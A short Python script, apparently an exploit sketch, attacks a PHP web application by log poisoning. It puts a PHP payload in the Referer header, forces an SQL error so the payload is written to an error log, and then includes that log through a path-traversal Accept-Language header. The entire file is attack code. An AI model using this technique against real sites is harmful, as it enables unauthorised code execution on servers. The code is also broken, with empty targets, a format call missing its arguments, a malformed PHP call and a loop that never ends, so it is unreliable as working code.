import requests

ref="<?php file_put_contents('../fonction.php');validation();?>"

headers={"HTTP_REFERER": ref}
url = ""
sqlerr = ""

# cause error, writes error file
r = requests.get(url+sqlerr, headers=headers)

if "" not in r.text:
    print("bug")
    print(r.text)

# retrieve error file
lang="../erreur/{0}-{1}.log"

done = False
while not done:
    r = requests.get(url, headers={"HTTP_ACCEPT_LANGUAGE": lang.format()})
    if "xxx" not in r.text:
        print("success")


